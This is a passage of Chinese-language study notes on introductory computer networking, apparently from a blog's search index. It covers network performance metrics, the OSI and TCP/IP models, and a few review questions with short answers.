速率：数据传输的速率
带宽：表示某通道传输数据的能力
时延：分为发送时延，传播时延，处理时延和排队时延
时延带宽积：时延*带宽
吞吐量：单位时间内，通过某网络的实际数据量
往返时间RTT：从发送开始计时直到发送方收到接收方的确认
利用率：信道的利用率

计算机网络体系结构，最有名的是两种：OSI参考模型和TCP/IP的四层协议</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="avatar"></p>
<h2 id="部分习题："><a href="#部分习题：" class="headerlink" title="部分习题："></a>部分习题：</h2><pre><code>C/S和P2P的主要区别是什么？有什么相同的地方？
前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用

计算机网络有哪些常用的性能指标？
速率，带宽，吞吐量，时延，时延带宽积，往返时间RTT,利用率

网络协议的三要素是什么？有什么含义？
语法：即数据与控制信息的结构或格式
语义：即需要发出何种控制信息，完成何种动作
同步：即事件发生的顺序</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BB%AA%E8%AE%BA.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
</search>
